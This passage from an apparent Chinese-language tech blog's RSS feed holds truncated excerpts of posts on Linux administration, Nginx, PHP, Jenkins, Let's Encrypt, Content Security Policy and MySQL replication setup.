https://technet.microsoft.com/en-us/library/cc778623(v=ws.10).aspx</description>
    </item>
    
    <item>
      <title>监控PHP fatal errors错误日志发送邮件</title>
      <link>https://ifunbox.top/monitor-php-error-log-sendmail/</link>
      <pubDate>Mon, 07 Aug 2017 09:17:46 +0000</pubDate>
      
      <guid>https://ifunbox.top/monitor-php-error-log-sendmail/</guid>
      <description>最近自己搞的小项目php报错几天后才被人发现，看来来个监控十分重要了。需要自动监控error_log一有新错误发送邮件通知下技术员，发现SEC -simple event correlator这个强大稳定的工具可以满足我的需要。
SEC是一个Perl脚本（〜11k行代码！），当有致命错误时，SEC会向您发送通知。可以使用正则表达式来查找需要发送的内容。所以您可以将其用于更复杂的设置，如应用程序日志或Web服务器访问日志~~~
 安装 EPEL 资源
sudo yum install epel-release  安装SEC
yum install sec  配置SEC
vim /etc/sec/php.conf type=Single ptype=RegExp pattern=^\[.+\] PHP Fatal error.+$ desc=PHP error action=add nginx-php-errors $0 type=Calendar time=* * * * * desc=Mail web errors context=nginx-php-errors action=report nginx-php-errors /bin/mail -s &amp;quot;example.com PHP errors&amp;quot; admin@example.com; delete nginx-php-errors;  启动配置
vim /etc/sysconfig/sec SEC_ARGS[0]=&amp;quot;-detach --conf=/etc/sec/php.conf --input=/var/log/php-fpm/example.com-error.log -log=/var/log/sec -intevents -pid=/var/run/sec.pid --debug=6&amp;quot; #加载多配置 SEC_ARGS[1]=&amp;quot;-detach --conf=/etc/sec/php2.conf --input=/var/log/php-fpm/example2.com-error.log -log=/var/log/sec -intevents -pid=/var/run/sec2.</description>
    </item>
    
    <item>
      <title>分区概念</title>
      <link>https://ifunbox.top/dev-partition/</link>
      <pubDate>Thu, 03 Aug 2017 09:27:23 +0000</pubDate>
      
      <guid>https://ifunbox.top/dev-partition/</guid>
      <description>首先我们需要知道，硬盘分区的存在，是由硬盘的物理特性决定的，并不会因为操作系统的不同而有所改变。
如果您需要Linux，您首先需要找到一本书名为《linux》的书，书名相当于硬盘中的MBR，也就是主引导纪录。不同的是，MBR可以是几个书名合在一起，类似于《XX合订本》。这部分内容暂时还没有什么实用价值，您只需要大概的了解。
而正文，就是硬盘中纪录的数据，这也非常容易理解，且对于安装系统并没有什么影响，所以现在我们来了解目录:
目录相当于硬盘中的分区表，书中的每一个章节，相当于硬盘中的一个分区，它起始和结束的页次，都可以在目录中找到。试想，如果阅读一本撕掉目录的书，您将很难找到您想阅读的部分。同样，如果没有分区表，操作系统也不能够在硬盘上定位数据的位置。
由于历史的原因，硬盘中的分区表大小受到了限制，最多只可以容纳四个分区（主分区）。如果一本书，它的目录最多只能有四个章节，那不是太可怕了么？很多书的内容远远不止四个章节啊！
于是聪明的人们想到了一个变通的办法，就是利用其中的一个章节，来存储其它部分的目录。比如第一章是前言，第二章是其它部分的目录，我们翻到第二章，呵呵，这里是第二个目录，因为只有第一个目录受四个章节的限制，所以这个目录的内容可以非常的详尽。第二个目录就是分区表中的扩展分区了，其中定义的章节，就是硬盘中的逻辑分区，不是很难理解吧？
明白了这一点，我们来看看Linux和Windows对于分区不同的表示方法：
可能您已经很熟悉Windows了，它使用盘符来表示分区，比如 C: D: E: ，每一个分区使用一个盘符来标识，而且顺序可以颠倒， D: 并不一定就是您系统中的第二个分区。（如果您给第二个分区分配最后一个硬盘盘符，把所有的盘符按顺序排列好，并且重装一次系统，您就会理解什么叫作“头疼”了）
而在Linux中，分区是这样表示的
/dev/hda1 /dev/hda2 /dev/hda5 /dev/sdb1  以 /dev/hda5 为例:
因为在Linux中，每一个设备都是用 /dev/ 文件夹下的一个文件来表示，所以 /dev/hda5 中， /dev/ 表示的是根目录下的dev目录，我们来看剩下的部分 hda5 。
前两位的字母 hd 表示这是一块IDE硬盘，如果是 sd ，则代表SATA硬盘，或者闪存等外设。
第三位的字母 a 表示这是该类型接口上的第一个设备。同理， b、c、d…… 分别代表该类型接口上的第二三四……个设备。例如 hdc 表示第二个IDE接口上的主硬盘（每个IDE接口上允许一个主设备和一个从设备）。
第四位的数字 5 ，并不表示这是该硬盘中的第5个分区，而是第一个逻辑分区。因为在Linux中，为了避免不必要的混乱，分区的顺序是不能改变的，分区标识则由它们在硬盘中的位置决定。系统又要为所有可能的主分区预留标识，所以 1-4 一定不会是逻辑分区， 5 则是第一个逻辑分区，以此类推。
/dev/hdb5 第二块硬盘的第一逻辑分区 /dev/sda4 第一块 SATA 硬盘的第四主分区，或者扩展分区 /dev/null 黑洞设备  挂载分区 https://i.linuxtoy.org/docs/guide/ch08s02.html</description>
    </item>
    
    <item>
      <title>标准编译安装</title>
      <link>https://ifunbox.top/gcc-install/</link>
      <pubDate>Thu, 03 Aug 2017 08:30:26 +0000</pubDate>
      
      <guid>https://ifunbox.top/gcc-install/</guid>
      <description>为什么要编译安装 包管理系统是绝大多数发行版的必备组件，也是一个发行版区别于其它发行版的主要特征。但是有些软件，并不能通过包管理系统安装，这就需要下载源码编译安装。
一个软件可能有许多功能，但是发行版中提供的安装包，通常只具有一些常见的功能。如果提供所有功能，那么无疑会占用更多的资源，而这些功能，大多数用户不会用到；而你会用到的功能，可能安装包中刚好没有。编译安装可以灵活地定制软件，选择自己需要的，取消自己不需要的。
编译安装还可以针对特定的硬件进行优化，以获得更好的性能表现。
编译环境 编译环境包括多个工具，它们环环相扣，称作编译工具链。主要包括以下工具：
   工具 简介     binutils 连接器、汇编器和其他用于目标文件和档案的工具   gcc 编译器，将源代码转换为机器代码   glibc C库，提供标准例程(C函数)   还有一些工具，能够调用工具链，实现自动化编译：    autoconf 自动生成 Makefile 文件   automake 自动生成 Makefile 文件   make 按照 Makefile 文件中的规则编译程序    标准编译安装 首先，下载源代码，通常是压缩包，如：xxx.tar.gz 或者 xxx.tar.bz2，解包：
   压缩包格式 命令     .tar.gz tar zxvf xxx.tgz   .</description>
    </item>
    
    <item>
      <title>Linux服务启动介绍</title>
      <link>https://ifunbox.top/linux-boot/</link>
      <pubDate>Wed, 26 Jul 2017 07:13:35 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux-boot/</guid>
      <description>启动流程  读取 MBR (主引导记录Master Boot Record)的信息，启动 Boot Manager 加载系统内核，启动 init进程 init进程 读取 /etc/inittab 文件中的信息，并进入预设的运行级别，按顺序运行该运行级别对应文件夹下的脚本。脚本通常以 start选项启动，并指向一个系统中的程序。 根据 /etc/rcS.d/文件夹中对应的脚本启动 Xwindow 服务器 xorg 启动登录管理器，等待用户登录  Windows 使用 NTLDR 作为 Boot Manager，如果您的系统中安装多个版本的 Windows，您就需要在 NTLDR 中选择您要进入的系统。 Linux 通常使用功能强大，配置灵活的 GRUB 作为 Boot Manager。 init进程 是 Linux 的根进程，所有的系统进程都是它的子进程。 通常情况下， /etc/rcS.d/ 目录下的启动脚本首先被执行，然后是 /etc/rcN.d/ 目录。例如您设定的运行级别为 3,那么它对应的启动目录为 /etc/rc3.d/ 。 Xwindow 为 Linux 下的图形用户界面系统。 大多 Linux 系统默认使用 GDM 作为登录管理器，您在登录管理器界面中输入用户名和密码后，便可以登录系统。（您可以在 /etc/rc3.d/ 文件夹中找到一个名为 S13gdm 的链接）   更改运行级别 在 /etc/inittab 文件中找到如下内容：</description>
    </item>
    
    <item>
      <title>Linux配置文件说明</title>
      <link>https://ifunbox.top/linux-etc/</link>
      <pubDate>Wed, 26 Jul 2017 07:11:41 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux-etc/</guid>
      <description>组   文件路径   说明     系统初始化   /etc/inittab   运行级别、控制台数量       /etc/timezone   时区       /etc/inetd.conf   超级进程     文件系统   /etc/fstab   开机时挂载的文件系统       /etc/mtab   当前挂载的文件系统     用户系统   /etc/passwd   用户信息       /etc/shadow   用户密码       /etc/group   群组信息       /etc/gshadow   群组密码       /etc/sudoers   Sudoer 列表     Shell   /etc/shell   可用 Shell 列表       /etc/inputrc   ReadLine 控件设定       /etc/profile   用户首选项       /etc/bash.</description>
    </item>
    
    <item>
      <title>Content Security Policy教程</title>
      <link>https://ifunbox.top/content-security-policy/</link>
      <pubDate>Wed, 26 Jul 2017 06:05:08 +0000</pubDate>
      
      <guid>https://ifunbox.top/content-security-policy/</guid>
      <description>简介 跨域脚本攻击 XSS 是最常见、危害最大的网页安全漏洞。
为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？
这就是&amp;#8221;网页安全政策&amp;#8221;（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。
CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。
CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。
开启方式
#通过 HTTP 头信息的Content-Security-Policy Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https: #通过网页的&amp;amp;lt;meta&amp;amp;gt;标签。 &amp;amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&amp;quot;&amp;amp;gt;  具体含义:
* 脚本：只信任当前域名
* &amp;lt;object&amp;gt;标签：不信任任何URL，即不加载任何资源
* 样式表：只信任cdn.example.org和third-party.org
* 框架（frame）：必须使用HTTPS协议加载
* 其他资源：没有限制
启用后，不符合 CSP 的外部资源就会被阻止加载，现代浏览器(Chrome/Firefox) Console控制台中将会报错。
限制选项  资源加载限制  script-src：外部脚本 style-src：样式表 img-src：图像 media-src：媒体文件（音频和视频） font-src：字体文件 object-src：插件（比如 Flash） child-src：框架 frame-ancestors：嵌入的外部资源（比如&amp;lt;frame&amp;gt;、&amp;lt;iframe&amp;gt;、&amp;lt;embed&amp;gt;和&amp;lt;applet&amp;gt;） connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等） worker-src：worker脚本 manifest-src：manifest 文件  default-src</description>
    </item>
    
    <item>
      <title>Linux操作系统目录简介</title>
      <link>https://ifunbox.top/linux_directory/</link>
      <pubDate>Wed, 26 Jul 2017 00:41:31 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux_directory/</guid>
      <description>Linux 系统中的目录    目录   说明     /   根目录，万物起源。     /bin   包含系统启动和运行所必须的二进制程序。     /boot   包含 Linux 内核、初始 RAM 磁盘映像（用于启动时所需的驱动）和 启动加载程序。有趣的文件：
 /boot/grub/grub.conf or menu.lst， 被用来配置启动加载程序。
/boot/vmlinuz，Linux 内核。    /dev   这是一个包含设备结点的特殊目录。“一切都是文件”，也适用于设备。 在这个目录里，内核维护着所有设备的列表。     /etc   这个目录包含所有系统层面的配置文件。它也包含一系列的 shell 脚本， 在系统启动时，这些脚本会开启每个系统服务。这个目录中的任何文件应该是可读的文本文件。
 有趣的文件：虽然/etc 目录中的任何文件都有趣，但这里只列出了一些我一直喜欢的文件：  /etc/crontab， 定义自动运行的任务。</description>
    </item>
    
    <item>
      <title>MySQL SHOW PROCESSLIST输出详解</title>
      <link>https://ifunbox.top/mysql-show-processlist/</link>
      <pubDate>Tue, 25 Jul 2017 14:36:39 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql-show-processlist/</guid>
      <description>mysql&amp;amp;gt; SHOW FULL PROCESSLIST; +----+------+-----------+------+---------+------+-------+-----------------------+ | Id | User | Host | db | Command | Time | State | Info | +----+------+-----------+------+---------+------+-------+-----------------------+ | 65 | root | localhost | NULL | Query | 0 | NULL | SHOW FULL PROCESSLIST | +----+------+-----------+------+---------+------+-------+-----------------------+ 1 row in set (0.00 sec)   id
连接标识符。这是跟INFORMATION_SCHEMA.PROCESSLIST表的ID列中显示相同的值，即Performance_Schema.threads的PROCESSLIST_ID列，并由CONNECTION_ID函数返回。 User
发出语句的MySQL用户。如果这是system user，则它是指MYSQL服务器产生的非客户端线程，以在内部处理任务。这可能是复制从站或延迟行处理程序使用的I / O或SQL线程。unauthenticated user指的是已经与客户端连接关联但是尚未完成客户端用户的身份验证的线程。event_scheduler是指监视预定事件的线程。对于system user，在主机列中没有指定主机。 Host
发出该语句的客户端的主机名（除了没有主机的system user除外）。SHOW PROCESSLIST报告host_name中的TCP / IP连接的主机名称：client_port格式，以便更容易地确定哪个客户端正在做什么。 db
默认数据库，如果选择了一个，否则为NULL。 Command
线程正在执行的命令类型。     命令类型   说明     Binlog Dump   这是主服务器上的线程，用于将二进制日志内容发送到从属服务器。     Change user   线程正在执行改变用户操作。     Close stmt   线程正在关闭准备好的语句。     Connect   复制从库连接到其主库。     Connect Out   复制从库正在连接到其主库。     Create DB   线程正在执行create-database操作。     Daemon   此线程在服务器内部，而不是服务客户端连接的线程。     Debug   线程正在生成调试信息。     Delayed insert   线程是一个延迟插入处理程序。     Drop DB   线程正在执行drop-database操作。     Debug   线程正在生成调试信息。     Error       Execute   线程正在执行一个准备好的语句。     Fetch   线程正在获取一个准备语句的结果。     Field List   线程正在检索表列的信息。     Init DB   线程正在选择默认数据库。     Kill   线程正在杀死另一个线程。     Long Data   该线程在执行一个准备语句的结果中检索长数据。     Ping   线程正在处理服务器ping请求。     Prepare   线程正在准备一个准备好的语句。     Processlist   线程正在处理服务器ping请求。     Query   该线程正在执行一个语句。     Quit   线程正在终止。     Refresh   线程是刷新表，日志或缓存，或重置状态变量或复制服务器信息。     Register Slave   线程正在注册从服务器。     Reset stmt   线程正在重置一个准备好的语句。     Set option   线程正在设置或重置客户端语句执行选项。     Shutdown   线程正在关闭服务器。     Sleep   线程正在等待客户端向其发送新的语句。     Statistics   线程正在生成服务器状态信息。     Table Dump   线程将表内容发送到从属服务器。     Time   Unused。    上述只是一部分，此列的值对应于客户端/服务器协议和Com_xxx状态变量的COM_xxx命令。https://dev.</description>
    </item>
    
    <item>
      <title>Nginx配置Google Fonts、Google Ajax、Gravatar反向代理教程</title>
      <link>https://ifunbox.top/nginx-proxy-google-fonts-ajax/</link>
      <pubDate>Fri, 18 Nov 2016 04:00:23 +0000</pubDate>
      
      <guid>https://ifunbox.top/nginx-proxy-google-fonts-ajax/</guid>
      <description>nginx.conf配置开启proxy缓存
## # Nginx Cache Settings ## proxy_temp_file_write_size 128k; proxy_temp_path /var/cache/nginx/temp; proxy_cache_path /var/cache/nginx/cache levels=1:2 keys_zone=cache_one:50m inactive=7d max_size=5g;  Google Fonts反向代理配置vhost
#fonts.funboxpower.com.conf upstream google { server fonts.googleapis.com:443; } upstream gstatic { server fonts.gstatic.com:443; } server { listen 443 ssl; server_name fonts.funboxpower.com; #控制来源refer valid_referers server_name *.funboxpower.com funboxpower.com *.chengyinet.com chengyinet.com fonts.funboxpower.com; if ($invalid_referer) { return 404; } #配置https ssl_certificate /your_path/fullchain.pem; ssl_certificate_key /your_path/privkey.pem; location /css { #将获取的信息fonts.gstatic.com转化成fonts.funboxpower.com sub_filter &#39;fonts.gstatic.com&#39; &#39;fonts.funboxpower.com&#39;; sub_filter_once off; sub_filter_types text/css; proxy_pass_header Server; proxy_set_header Host fonts.</description>
    </item>
    
    <item>
      <title>CentOS下Jenkins安装及使用</title>
      <link>https://ifunbox.top/centos-jenkins-install-config/</link>
      <pubDate>Thu, 17 Nov 2016 09:33:09 +0000</pubDate>
      
      <guid>https://ifunbox.top/centos-jenkins-install-config/</guid>
      <description>安装 添加Jenkins库到yum库，Jenkins将从这里下载安装。
sudo wget -O /etc/yum.repos.d/jenkins.repo http://pkg.jenkins-ci.org/redhat/jenkins.repo sudo rpm --import https://jenkins-ci.org/redhat/jenkins-ci.org.key sudo yum install jenkins  1.安装成功后Jenkins会作为守护进程随系统启动
2.系统会创建一个用户“jenkins”来执行这个服务
3.启动参数在/etc/sysconfig/jenkins文件中，修改默认端口也在此改
4.Jenkins运行在8080端口，浏览器访问http://ip:8080
5.Jenkins的RPM仓库配置被加到/etc/yum.repos.d/jenkins.repo
6.启动/停止
sudo service jenkins start/stop/restart sudo chkconfig jenkins on  在浏览器中访问 首次进入会要求输入初始密码，初始密码在：/var/lib/jenkins/secrets/initialAdminPassword
输入密码，选择要安装的插件，等待插件安装结束然后创建管理者账号就好了。
一些常见的问题： 1.修改默认端口
/etc/sysconfig/jenkins
JENKINS_PORT=&amp;#8221;8080&amp;#8243;
2.插件下载国内镜像
插件管理-&amp;gt;高级-&amp;gt;升级站点
http://mirror.bit.edu.cn/jenkins/updates/update-center.json
3.绑定域名
系统管理-&amp;gt;Jenkins Location-&amp;gt; Jenkins URL
服务端持续可集成配置参考 http://yyqian.com/post/1460773574738/
https://www.ibm.com/developerworks/cn/java/j-lo-jenkins/</description>
    </item>
    
    <item>
      <title>Let’s Encrypt，给自己的博客加https</title>
      <link>https://ifunbox.top/letsencrypt-nginx-https/</link>
      <pubDate>Wed, 19 Oct 2016 13:02:06 +0000</pubDate>
      
      <guid>https://ifunbox.top/letsencrypt-nginx-https/</guid>
      <description>对Let&amp;#8217;s Encrypt免费项目早有耳闻，今天终于给自己的博客加上https。
Let&amp;#8217;s Encrypt是国外一个公共的免费SSL项目，由 Linux 基金会托管，它的来头不小，由Mozilla、思科、Akamai、IdenTrust和EFF等组织发起，目的就是向网站自动签发和管理免费证书，以便加速互联网由HTTP过渡到HTTPS，目前Facebook等大公司开始加入赞助行列。
Let&amp;#8217;s Encrypt已经得了 IdenTrust 的交叉签名，这意味着其证书现在已经可以被Mozilla、Google、Microsoft和Apple等主流的浏览器所信任，你只需要在Web 服务器证书链中配置交叉签名，浏览器客户端会自动处理好其它的一切，Let&amp;#8217;s Encrypt安装简单，未来大规模采用可能性非常大。
旧版的安装方式，新版往下拉~
获取证书，非常的简单，但由于国内网络的原因，会比较慢一些
git clone https://github.com/letsencrypt/letsencrypt cd letsencrypt #每个-d参数后面跟一个域名，需要申请几个域名的证书就跟几个，需要确认这些域名都解析到当前vps的ip上 ./letsencrypt-auto certonly --standalone -d example.com -d www.example.com  完成后会有如下提示：
Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/example.com/fullchain.pem. Your cert will expire on xxxx-xx-xx. To obtain a new version of the certificate in the future, simply run Let&#39;s Encrypt again.  但过程并非那么顺利，报错了，跟我的屌丝配置内存512M有关~~~
Error: open CFI at the end of file; missing .</description>
    </item>
    
    <item>
      <title>PHP调试利器XDebug Mac下在phpstorm中的安装与使用</title>
      <link>https://ifunbox.top/mac_php_xdebug_phpstorm_install/</link>
      <pubDate>Thu, 22 Sep 2016 08:47:04 +0000</pubDate>
      
      <guid>https://ifunbox.top/mac_php_xdebug_phpstorm_install/</guid>
      <description>之前一直用比较原始的调试方法echo、print_r()、var_dump()、printf()，可能小项目比较小吧
最近有时间，就研究了Mac系统下集成phpstorm的xdebug安装配置使用，下面记录一下~
安装篇 1.xdebug的安装
下载地址https://xdebug.org/
我是直接用神器brew安装（版本号自行替换）
brew install homebrew/php/php56-xdebug
安装完毕后brew info homebrew/php/php56-xdebug 包含了很多信息 包括xdebug的配置文件路径，如何判断安装成功等等
2.配置xdebug
在/usr/local/etc/php/5.6/conf.d/ext-xdebug.ini
[xdebug]
zend_extension=&amp;#8221;/usr/local/opt/php56-xdebug/xdebug.so&amp;#8221;
xdebug.remote_enable=1
xdebug.remote_host=&amp;#8221;127.0.0.1&amp;#8243;
xdebug.remote_port=9001
xdebug.profiler_enable=1
xdebug.profiler_output_dir=&amp;#8221;/Users/www/debug&amp;#8221;
xdebug.idekey=&amp;#8221;PHPSTORM&amp;#8221;
3.在phpstorm中配置xdebug
上面都配置好后要在主菜单中，选择Run | Web Server Debug Validation.下图是验证成功的效果，但是没有那么顺利，报错Remote host is configured as “localhost” despite server host is probably not local，在stackoverflow有人说把xdebug.remote_host改成自己项目的域名就可以了，还真是不知道是为何。。。
4.phpstorm配置一个PHP Web Application
5.打开Chrome下载安装xdebug-helper，地址https://chrome.google.com/webstore/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc
点开选项记得把IDE key配置得跟之前设置的一样
到这里安装配置就结束了~~~
使用篇 1.phpstorm 打开监听 Run | Start Listening For PHP Debug Connections
2.打个断点
3.访问项目域名，就可以在phpstorm中看到变量信息，点击红框，可以查看每次执行的代码行，也会看到因为执行代码行所赋值的变量。
还有一个就是php报错的时候回显示堆栈信息参考
https://www.jetbrains.com/help/phpstorm/2016.2/configuring-xdebug.html
http://stackoverflow.com/questions/36001918/phpstorm-xdebug-remote-host-is-configured-as-localhost-despite-server-host</description>
    </item>
    
    <item>
      <title>Linux free命令查看内存情况学习小记</title>
      <link>https://ifunbox.top/linux_command_free/</link>
      <pubDate>Tue, 14 Jun 2016 01:53:04 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux_command_free/</guid>
      <description>最近项目碰到php-fpm占用太多内存的情况，为了深入了解其原因，开始学习os相关的内存知识，记录备忘下
1 total used free shared buffers cached 2 Mem: 24677460 23276064 1401396 0 870540 12084008 3 -/+ buffers/cache: 10321516 14355944 4 Swap: 25151484 224188 24927296  第二行(mem)，从OS的角度来看，因为对于OS，buffers/cached 都是属于被使用，所以他的可用内存是1401396KB,已用内存是24677460KB,其中包括，内核（OS）使用+Application(X,oracle,etc)使用的+buffers+cached。
total:总计物理内存的大小。
used:已使用多大。
free:可用有多少。
Shared:多个进程共享的内存总额，现在已经deprecated，其值总是0（当然在一些系统上也可能不是0，主要取决于free命令是怎么实现的）。
Buffers/cached:磁盘缓存的大小，FO[2][5]表示被OS buffer住的内存。FO[2][6]表示被OS cache的内存。在有些时候buffer和cache这两个词经常混用。不过在一些比较低层的软件里是要区分这两个词的，看老外的洋文:
 _A buffer is something that has yet to be &amp;#8220;written&amp;#8221; to disk.
_ A cache is something that has been &amp;#8220;read&amp;#8221; from the disk and stored for later use.  也就是说buffer是用于存放要输出到disk（块设备）的数据的，而cache是存放从disk上读出的数据。这二者是为了提高IO性能的，并由OS管理。
第三行(-/+ buffers/cached)，从应用程序角度来看，对于应用程序来说，buffers/cached 是等于可用的，因为buffer/cached是为了提高文件读取的性能，当应用程序需在用到内存的时候，buffer/cached会很快地被回收。</description>
    </item>
    
    <item>
      <title>Nginx下php-fpm防止跨站跨目录安全设置</title>
      <link>https://ifunbox.top/nginx_php-fpm_cross-site/</link>
      <pubDate>Wed, 13 Apr 2016 07:03:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/nginx_php-fpm_cross-site/</guid>
      <description>apache php mod的方式可以很方便的配置open_basedir限制各个站点的目录访问权限。
而nginx + php-fpm fastcgi的方式，就需要多费费心啦~
首先php的版本必须大于等于php5.3.3。
方法1 在nginx 配置 fastcgi_param参数
在nginx的 php配置中 或者 在 包含的 include fastcgi.conf 文件中加入：
fastcgi_param PHP_VALUE &amp;quot;open_basedir=$document_root:/tmp/:/proc/&amp;quot;;  意思是设置fastcgi 参数 PHP_VALUE 的open_basedir。
$document_root php文档根目录，就是 nginx 配置项 root 配置的网站目录。
/tmp/目录需要有权限，默认放seesion的位置，以及unixsock。
/proc/ 可以让php查看系统负载信息。
本方法加的各个vhost 虚拟主机，都可以完美使用。都限制到自己的网站目录下。
本方法，非常推荐使用，本人就是用这个方法！！
方法2 在php.ini 中配置
在php.ini的末尾加入：
[HOST=www.funboxpower.com] open_basedir=/home/funboxpower.com:/tmp/:/proc/ [PATH=/home/funboxpower.com] open_basedir=/home/funboxpower.com:/tmp/:/proc/  本方法的弊端，如果有泛域名解析，比如 *.funboxpower.com 。这个就不好控制。
方法3 网站根目录下增加 .user.ini 文件。
在网站根目录下创建.user.ini 加入：
open_basedir=/home/wwwroot/blog.jiunile.com:/tmp/:/proc/  这种方式不需要重启nginx或php-fpm服务。安全起见应当取消掉.user.ini文件的写权限。
关于.user.ini文件的详细说明：http://php.net/manual/zh/configuration.file.per-user.php</description>
    </item>
    
    <item>
      <title>通过ngx-lua来统计nginx上的虚拟主机性能数据</title>
      <link>https://ifunbox.top/ngx-lua-stats/</link>
      <pubDate>Wed, 30 Mar 2016 02:30:09 +0000</pubDate>
      
      <guid>https://ifunbox.top/ngx-lua-stats/</guid>
      <description>最近研究公司项目，发现是用ngx-lua来统计api的日均请求量、峰值、响应时间、状态码等等。
用ngx-lua来做性能统计、甚至一些运营数据统计，都是非常好的选择。
1.几乎对原有项目代码分离
2.性能佳
3.支持分不同虚拟主机统计, 同一个虚拟主机下可以分不同的location统计
4.可以统计与query-times、request-time、status-code、speed相关的数据
因为基于ngx-lua所以需要先安装环境，请移步Nginx安装lua-nginx-module模块
github这个项目https://github.com/initial5/ngx-lua-stats前辈们已给代码
使用方法就是在nginx.conf的http中配置加入
lua_shared_dict log_dict 5M; lua_shared_dict result_dict 5M;  然后在入口nginx上配置
server { listen 80; server_name funboxpower.com; access_log /home/logs/funboxpower.com.log main; location / { proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; proxy_pass http://funboxpower.com_backend; log_by_lua_file ./site-enable/record.lua; } }  记得配upstream，否则之后用到的统计有关于upstream的值是出不来的，这个我还要进一步确认下
然后可以再配一个server
server { listen 8080 default; server_name _; location / { return 404; } location /status { content_by_lua_file ./site-enable/output.lua; } location /empty_dict { content_by_lua_file ./site-enable/empty_dict.lua; } }  配置好后，就可以通过如下命令获取</description>
    </item>
    
    <item>
      <title>Nginx安装lua-nginx-module模块</title>
      <link>https://ifunbox.top/nginx_install_lua-nginx-module/</link>
      <pubDate>Fri, 25 Mar 2016 08:30:57 +0000</pubDate>
      
      <guid>https://ifunbox.top/nginx_install_lua-nginx-module/</guid>
      <description>如果是还没有安装nginx的小伙伴可以直接下载openresty安装简单快捷，http://openresty.org/cn/installation.html
安装了nginx的小伙伴就继续往下看咯~
1.下载安装LuaJIT 2.1（2.0或者2.1都是支持的，官方推荐2.1）
http://luajit.org/download.html
wget http://luajit.org/download/LuaJIT-2.1.0-beta2.tar.gz tar zxf LuaJIT-2.1.0-beta2.tar.gz cd LuaJIT-2.1.0-beta2 make PREFIX=/usr/local/luajit make install PREFIX=/usr/local/luajit  2.下载最新的ngx_devel_kit（NDK）模块
https://github.com/simpl/ngx_devel_kit/tags
wget https://github.com/simpl/ngx_devel_kit/archive/v0.2.19.tar.gz tar -xzvf v0.2.19.tar.gz  3.下载最新的lua-nginx-module 模块
https://github.com/openresty/lua-nginx-module/tags
tar -xzvf v0.10.2.tar.gz  nginx -v看下nginx版本下载相同的版本源码，如果有了就进入源码目录不是安装目录哦
export LUAJIT_LIB=/usr/local/luajit/lib export LUAJIT_INC=/usr/local/luajit/include/luajit-2.1  nginx -V看下之前的安装都带了哪些参数
--add-module后参数路径根据解压路径为准 make -j2 make install  4.验证lua-nginx-module安装是否成功
在nginx下配置
default_type &#39;text/plain&#39;; content_by_lua &#39;ngx.say(&amp;quot;hello, lua&amp;quot;)&#39;; }  访问显示hello, lua说明lua-nginx-module安装成功了~~~</description>
    </item>
    
    <item>
      <title>Mac OS X上brew安装多版本php切换</title>
      <link>https://ifunbox.top/mac_osx_brew_php_version/</link>
      <pubDate>Mon, 21 Mar 2016 13:40:21 +0000</pubDate>
      
      <guid>https://ifunbox.top/mac_osx_brew_php_version/</guid>
      <description>一直是用php5.6在mac开发，公司有个项目用zend guard加密，必须用php5.4的版本
用brew install homebrew/php/php54，提示冲突必须先brew unlink php56
偶然发现php-version这个工具可以在mac下任意切换php各个版本
 然后运行
 安装完毕之后php-version，显示当前安装的全部php版本列表
直接运行php-version php版本号，即可完成切换
php -v 显示php版本已经变了，切换成功
brew真心强大</description>
    </item>
    
    <item>
      <title>Linux MySQL5.6 主从复制配置</title>
      <link>https://ifunbox.top/linux_mysql56_replication/</link>
      <pubDate>Tue, 15 Dec 2015 10:25:01 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux_mysql56_replication/</guid>
      <description>环境说明：
两台安装在CentOS6.5的MySQL5.6.21服务器：master 和 slave Master服务器： IP：192.168.80.51 Port：3316 Slave 服务器： IP：192.168.80.52 Port：3316 配置步骤：
1、 修改master的my.cnf配置文件，开启记录日志并设置server-id。
2、 修改slave的my.cnf配置文件，开启读取二进制日志并设置server-id。
3、 在slave上启动slave与master的连接。
4、 检查是否配置成功与排错。
1、 修改 master 的my.cnf配置文件，在[mysqld]下添加如下配置：
[mysqld]
log-bin=/usr/local/mysql56/binlog/master-bin
log-bin-index=/usr/local/mysql56/binlog/master-bin.index
server-id=1
说明：
log-bin 配置的是开启二进制日志，并将日志写在配置的路径上。记录的日志将以master-bin.000001 的方式进行记录。
log-bin-index 配置的是二进制日志记录文件的目录。该文件中每一行都是二进制日志文件的路径。
server-id是该MySQL服务器的服务ID，用于区分在主从配置中的其他服务器。
配置成功后，重启mysqld服务。
注意：如果不定义log-bin的文件名，则会以hostname主机名命名，一旦主机名修改，则会因为找不见二进制文件报错。所以最好还是显示指定文件名。
2、 修改 slave 的my.cnf配置文件，在[mysqld]下添加如下配置：
server-id=11
relay-log=/usr/local/mysql56/binlog/slave-relay-bin
relay-log-index=/usr/local/mysql56/binlog/slave-relay-bin.index
server-id和master意义一样，用于区分不同的mysql服务器。
relay-log用以记录收到的中继二进制日志。relay-log-index用以保存收到的日志路径索引。如果不显示指定文件名，则以hostname值命名。
保存后可以重启mysqld服务。
3、 在slave上启动slave与master的连接。
在slave上登录到mysql，在mysql&amp;gt;：下进行操作。
3.1、mysql&amp;gt;stop slave; //停止slave。
3.2、mysql&amp;gt;change master to master_host = &amp;#8216;192.168.80.51&amp;#8217;,master_user=&amp;#8217;root&amp;#8217;,master_password=&amp;#8217;root&amp;#8217;,master_log_file=&amp;#8217;master-bin.000001&amp;#8242;,master_log_pos=1; 
3.3、mysql&amp;gt;start slave;
4、检查是否配置成功与排错
mysql&amp;gt;show slave status \G;
在打印出来的状态下，查看以下两个参数的值：
Slave_IO_Running: Yes</description>
